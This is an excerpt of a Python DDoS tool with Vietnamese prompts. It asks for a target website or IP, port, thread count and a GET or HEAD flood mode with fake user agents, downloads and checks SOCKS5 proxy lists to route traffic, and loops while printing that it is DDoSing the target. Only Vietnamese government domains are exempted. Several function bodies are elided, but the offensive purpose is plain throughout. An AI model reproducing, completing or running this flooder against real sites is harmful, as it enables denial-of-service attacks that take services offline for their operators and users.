...
def clone():
    ...
    try:
        ...
        f.close()
    print("Danh Sách Proxy Socks 5 Tải Xuống Thành Công!")

def prevent():
    if '192.168' in ip or '127.0' in ip or '172.16' in ip or 'localhost' in ip :
        print("Vùng IP đã nhập là localhost!")
    if 'gov.vn' in ip :
        print("Bạn không thể tấn công trang web của chính phủ Việt Nam! Protected by Nguyễn Ngọc Bảo Châu (chaudvfb).")
        exit()
...
def main():
    ...
    global multiple
    global mode
    mode = str(input("Chọn chế độ (GET Flood/HEAD Flood - Fake User Agent + Arrivals) [GET/HEAD]:"))
    if mode == "":
        mode = "get"
    else:
        mode = str(mode)
    if mode == "get" or mode == "GET":
        print("Đã Chọn Chế Độ Get Flood")
    elif mode == "head" or mode == "HEAD":
        print("Đã Chọn Chế Độ Head Flood")
    ip = str(input("Địa Chỉ Web/IP (Địa chỉ web không cần HTTP/HTTPS):"))
    prevent()
    if ip == "":
        print("Địa Chỉ Web/IP Không Thể Được Để Trống!")
        exit()
    page = str(input("Đường Dẫn (Mặc Định=/):"))
    if page == "":
        page = "/"
    port = str(input("Cổng (HTTP=80-HTTPS=443):"))
    if port =="":
        port = 80
        print("Đã chọn cổng 80!")
    else:
        port = int(port)
    if port == 443:
        print("Đã chọn cổng 443!")        
    th_num = str(input("Số kết nối cùng lúc (Mặc định=300):"))
    if th_num == "":
        th_num = int(300)
    else:
        th_num = int(th_num)
    #if mode == "get" or mode == "GET":
    N = str(input("Tải xuống danh sách Proxy Socks5? (Có/Không) [y/n]:"))
    if N == "n" or N =="N":
        pass
    else:
        clone()
    ...
    print ("Số proxy hiện có: %s" %(len(open(out_file).readlines())))
    proxies = open(out_file).readlines()
    time.sleep(0.3)
    ans = str(input("Kiểm tra danh sách Proxy Socks5? (Có/Không) [y/n]:"))
    if ans == "n" or ans =="N":
        pass
    else:
        ms = str(input("Thời gian nghỉ mỗi Socks (Theo Giây, Mặc Định=1):"))
        if ms == "":
            ms = int(1)
        else :
            ms = int(ms)
    check_socks()
    proxies = open(out_file).readlines()
    multiple = str(input("Nhập số luồng (Mặc Định=100):"))
    if multiple == "":
        multiple = int(100)
    else:
...
def check_socks():
	...
	for lines in list(proxies):
		...
		time.sleep(0.01)
		sys.stdout.write("Kiểm tra "+str(nums)+" Proxy\r")
		sys.stdout.flush()
	for th in list(thread_list):
		th.join()
		sys.stdout.write("Kiểm tra "+str(nums)+" Proxy\r")
		sys.stdout.flush()
	print("\r\n Đã kiểm tra toàn bộ Proxy, số Proxy hoạt động:"+str(len(proxies)))
...
while True:
        ...
        try:
            if n>=4:
                n = 0
            time.sleep(0.1)
            sys.stdout.write("["+str(key[n])+"]ĐANG DDOS "+ip+page+":"+str(port)+"\r")
            sys.stdout.flush()
            n +=1
